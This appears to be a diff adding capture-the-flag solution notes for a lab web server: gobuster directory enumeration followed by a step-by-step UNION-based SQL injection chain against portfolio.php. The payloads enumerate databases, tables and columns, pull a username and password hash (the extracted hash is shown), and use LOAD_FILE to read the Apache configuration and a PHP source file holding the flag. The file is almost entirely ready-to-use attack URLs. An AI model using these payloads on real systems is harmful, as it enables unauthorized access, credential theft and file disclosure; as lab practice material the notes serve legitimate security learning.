@@ -1,0 +1,41 @@
+# Enmeration and reconnaissance:
+gobuster dir -u http://<IP>:<PORT>/ -w /usr/share/wordlists/dirb/common.txt -t 10 -e php
+gobuster dir -u http://<IP>:<PORT>/administrat -w /usr/share/wordlists/dirb/common.txt -t 10 -e php
+
+# Rabbit hole:
+	# identify amount of columns:
+	http://<IP>:<PORT>/portfolio.php?id=1%20UNION%20SELECT%20NULL%20,NULL,NULL%20--%20-
+
+	# Identify display column:
+	http://<IP>:<PORT>/portfolio.php?id=1%20UNION%20SELECT%201,NULL,NULL%20FROM%20information_schema.tables--%20-
+	http://<IP>:<PORT>/portfolio.php?id=1%20UNION%20SELECT%20NULL,1,NULL%20FROM%20information_schema.tables--%20-
+
+	# Identify databases:
+	http://<IP>:<PORT>/portfolio.php?id=1%20UNION%20SELECT%20NULL,table_schema,NULL%20FROM%20information_schema.tables--%20-
+
+	# Identify tables within target DB:
+	http://<IP>:<PORT>/portfolio.php?id=1%20UNION%20SELECT%20NULL,table_name,NULL%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27freelancer%27--%20-
+
+	# Identify columns within target DB:
+	http://<IP>:<PORT>/portfolio.php?id=1%20UNION%20SELECT%20NULL,column_name,NULL%20FROM%20information_schema.columns%20WHERE%20table_schema%20=%20%27freelancer%27--%20-
+
+	# Exfiltrate hash and user from the target column within the target DB's target table 
+	http://<IP>:<PORT>/portfolio.php?id=1%20UNION%20SELECT%20NULL,GROUP_CONCAT(username,%20%27%20%27,%20password),NULL%20FROM%20freelancer.safeadmin%20--%20-
+
+	result:
+	safeadm $2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K -
+
+# Correct path:
+	# identify amount of columns:
+	http://<IP>:<PORT>/portfolio.php?id=1%20UNION%20SELECT%20NULL%20,NULL,NULL%20--%20-
+
+	# Identify display column:
+	http://<IP>:<PORT>/portfolio.php?id=1%20UNION%20SELECT%201,NULL,NULL%20FROM%20information_schema.tables--%20-
+	http://<IP>:<PORT>/portfolio.php?id=1%20UNION%20SELECT%20NULL,1,NULL%20FROM%20information_schema.tables--%20-
+
+	# Utilize SQL injection local file to identify the Docmuent Root of the apache2 web-server:
+	http://<IP>:<PORT>/portfolio.php?id=1%20UNION%20SELECT%20NULL,LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf'),NULL%20FROM%20information_schema.tables--%20-
+
+	# Finally utilize SQL injection local file to read to read /var/www/html/administrat/panel.php file and exfiltrate flag:
+	http://<IP>:<PORT>/portfolio.php?id=1%20UNION%20SELECT%20NULL,LOAD_FILE(%27/var/www/html/administrat/panel.php%27),NULL%20FROM%20information_schema.tables--%20-
+
